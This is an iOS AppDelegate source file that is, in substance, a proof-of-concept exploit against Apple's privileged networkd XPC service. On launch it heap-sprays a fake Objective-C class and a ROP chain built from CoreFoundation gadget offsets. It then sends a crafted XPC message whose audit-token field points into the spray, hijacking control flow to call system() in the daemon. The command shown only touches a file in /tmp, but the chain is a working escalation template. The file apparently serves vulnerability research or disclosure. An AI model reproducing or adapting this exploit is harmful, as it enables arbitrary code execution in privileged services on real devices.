#import "AppDelegate.h"
#import <xpc/xpc.h>
#include <mach/mach.h>
#include <mach/task.h>
#include <dlfcn.h>
#include <mach-o/dyld_images.h>
#include <objc/runtime.h>

@interface AppDelegate ()
 
@end

int size = 0;


struct heap_spray {
    void* fake_objc_class_ptr;
    uint32_t r10;
    uint32_t r4;
    uint32_t r5;
    uint32_t r6;
    uint32_t r7;
    uint32_t pc;
    uint8_t pad1[0x3c];
    uint32_t stack_pivot;
    struct fake_objc_class_t {
        char pad[0x8];
        void* cache_buckets_ptr;
        uint32_t cache_bucket_mask;
    } fake_objc_class;
    struct fake_cache_bucket_t {
        void* cached_sel;
        void* cached_function;
    } fake_cache_bucket;
    char command[1024];
};


void* find_library_load_address(const char* library_name){
    kern_return_t err;
    
    // get the list of all loaded modules from dyld
    // the task_info mach API will get the address of the dyld all_image_info struct for the given task
    // from which we can get the names and load addresses of all modules
    task_dyld_info_data_t task_dyld_info;
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    err = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&task_dyld_info, &count);
    
    const struct dyld_all_image_infos* all_image_infos = (const struct dyld_all_image_infos*)task_dyld_info.all_image_info_addr;
    const struct dyld_image_info* image_infos = all_image_infos->infoArray;
    
    for(size_t i = 0; i < all_image_infos->infoArrayCount; i++){
        const char* image_name = image_infos[i].imageFilePath;
        mach_vm_address_t image_load_address = (mach_vm_address_t)image_infos[i].imageLoadAddress;
        if (strstr(image_name, library_name)){
            return (void*)image_load_address;
        }
    }
    return NULL;
}



void heap_spray_and_pwn()
{
    void* heap_spray_target_addr = (void*)0x1fec000;
    
    struct heap_spray* hs = mmap(heap_spray_target_addr, 0x1000, 3, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
    memset(hs, 0x00, 0x1000);
    
    hs->fake_objc_class_ptr = &hs->fake_objc_class;
    hs->fake_objc_class.cache_buckets_ptr = &hs->fake_cache_bucket;
    hs->fake_objc_class.cache_bucket_mask = 0;
    hs->fake_cache_bucket.cached_sel = (void*) NSSelectorFromString(@"release");
    
    printf("fake_cache_bucket.cached_sel=%p\n",hs->fake_cache_bucket.cached_sel);
    
    uint8_t* CoreFoundation_base = find_library_load_address("CoreFoundation");
    NSLog(@"CoreFoundationbase address = 0x%08x", (uint32_t)CoreFoundation_base);
    
    
/*
    0x2dffc0ee: 0x4604       mov    r4, r0
    0x2dffc0f0: 0x6da1       ldr    r1, [r4, #0x58]
    0x2dffc0f2: 0xb129       cbz    r1, 0x2dffc100            ; <+28>
    0x2dffc0f4: 0x6ce0       ldr    r0, [r4, #0x4c]
    0x2dffc0f6: 0x4788       blx    r1
*/
    hs->fake_cache_bucket.cached_function = CoreFoundation_base + 0x0009e0ee + 1; //fake_struct.stack_pivot_ptr
    NSLog(@"hs->fake_cache_bucket.cached_function  = 0x%08x", (uint32_t)(CoreFoundation_base+0x0009e0ee));

    /*
     __text:2D3B7F78                 MOV             SP, R4
     __text:2D3B7F7A                 POP.W           {R8,R10}
     __text:2D3B7F7E                 POP             {R4-R7,PC}
     */

    hs->stack_pivot= CoreFoundation_base + 0x4f78 + 1;
    NSLog(@"hs->stack_pivot  = 0x%08x", (uint32_t)(CoreFoundation_base + 0x4f78));
    
    //    0x00000000000d3842 : mov r0, r4 ; mov r1, r5 ; blx r6
    
    strcpy(hs->command, "touch /tmp/iceandfire");
    hs->r4=(uint32_t)&hs->command;
    hs->r6=(void *)dlsym(RTLD_DEFAULT, "system");
    hs->pc = CoreFoundation_base+0xd3842+1;
    NSLog(@"hs->pc = 0x%08x", (uint32_t)(CoreFoundation_base+0xd3842));

    
    size_t heap_spray_pages = 0x2000;
    size_t heap_spray_bytes = heap_spray_pages * 0x1000;
    char* heap_spray_copies = malloc(heap_spray_bytes);
    
    for (int i = 0; i < heap_spray_pages; i++){
            memcpy(heap_spray_copies+(i*0x1000), hs, 0x1000);
    }
    
    xpc_connection_t client = xpc_connection_create_mach_service("com.apple.networkd", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
    
    xpc_connection_set_event_handler(client, ^void(xpc_object_t response) {
        xpc_type_t t = xpc_get_type(response);
        if (t == XPC_TYPE_ERROR){
            printf("err: %s\n", xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));
        }
        printf("received an event\n");
        });
    
    
    xpc_connection_resume(client);
    
    xpc_object_t dict = xpc_dictionary_create(NULL, NULL, 0);
    
    xpc_dictionary_set_uint64(dict, "type", 6);
    xpc_dictionary_set_uint64(dict, "connection_id", 1);
    
    xpc_object_t params = xpc_dictionary_create(NULL, NULL, 0);
    xpc_object_t conn_list = xpc_array_create(NULL, 0);
    
    xpc_object_t arr_dict = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(arr_dict, "hostname", "example.com");
    
    xpc_array_append_value(conn_list, arr_dict);
    xpc_dictionary_set_value(params, "connection_entry_list", conn_list);

    //0x1fec000
    uint32_t uuid[] = {0x0, 0x1fec000};
//    uint32_t uuid[] = {0x0, 0x41414141};

    xpc_dictionary_set_uuid(params, "effective_audit_token", (const unsigned char*)uuid);

    xpc_dictionary_set_uint64(params, "start", 0);
    xpc_dictionary_set_uint64(params, "duration", 0);
    
    xpc_dictionary_set_value(dict, "parameters", params);
    
    xpc_object_t state = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_int64(state, "power_slot", 0);
    xpc_dictionary_set_value(dict, "state", state);
    xpc_dictionary_set_data(dict, "heap_spray", heap_spray_copies, heap_spray_bytes);
    
    xpc_connection_send_message(client, dict);
    printf("enqueued message\n");


    NSLog(@"%@",dict);
    
    xpc_connection_send_barrier(dict, ^{printf("other side has enqueued this message\n");});
    
    xpc_release(dict);
 
}


@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    // Override point for customization after application launch.
    
    heap_spray_and_pwn();

    printf("entering CFRunLoop\n");
    for(;;){
        CFRunLoopRunInMode(kCFRunLoopDefaultMode, DBL_MAX, TRUE);
    }
    return YES;
}

- (void)applicationWillResignActive:(UIApplication *)application {
    // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
    // Use this method to pause ongoing tasks, disable timers, and throttle down OpenGL ES frame rates. Games should use this method to pause the game.
}

- (void)applicationDidEnterBackground:(UIApplication *)application {
    // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
    // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
    // Called as part of the transition from the background to the inactive state; here you can undo many of the changes made on entering the background.
}

- (void)applicationDidBecomeActive:(UIApplication *)application {
    // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
}

- (void)applicationWillTerminate:(UIApplication *)application {
    // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
}

@end
